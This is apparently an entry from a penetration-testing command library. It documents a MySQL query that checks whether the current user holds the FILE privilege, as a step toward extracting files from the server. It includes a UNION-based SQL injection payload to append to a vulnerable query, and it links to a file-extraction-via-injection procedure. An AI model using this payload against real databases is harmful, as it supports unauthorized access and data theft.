---
id: b7395248-7a11-481e-8e1f-53b0b521c16a
name: mysql-check-file-privilege
type: command
executor: sql
data: SHOW GRANTS FOR CURRENT_USER();
output: null
created_at: '2023-04-06T03:56:34.767391+00:00'
updated_at: '2023-04-10T20:22:51.267705+00:00'
platforms:
  - Linux
tags:
  - mysql
  - privilege-check
verified: true
validated: true
---

# mysql-check-file-privilege

## Command

```sql
SHOW GRANTS FOR CURRENT_USER();
```

## Description

This command queries the privileges granted to the current MySQL user, helping determine if FILE privilege is available for LOAD_FILE operations. Use it early in file extraction procedures to avoid permission errors.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| CURRENT_USER() | Built-in function returning the current authenticated user | Yes |

## Examples

### Basic Usage

```sql
SHOW GRANTS FOR CURRENT_USER();
```

### In Injection Context

Append to vulnerable query: ' UNION SELECT 1, (SELECT GROUP_CONCAT(GRANTEE) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE PRIVILEGE_TYPE="FILE") --
```

## Expected Output

A list of grant statements, such as:

GRANT USAGE ON *.* TO `app_user`@`localhost`
GRANT SELECT, INSERT ON `app_db`.* TO `app_user`@`localhost`
GRANT FILE ON *.* TO `app_user`@`localhost` (if present)

Look for the FILE grant to confirm access.

## Related

- [[procedures/mysql-file-content-extraction-via-injection]]
- [[commands/mysql-grant-file-privilege]]
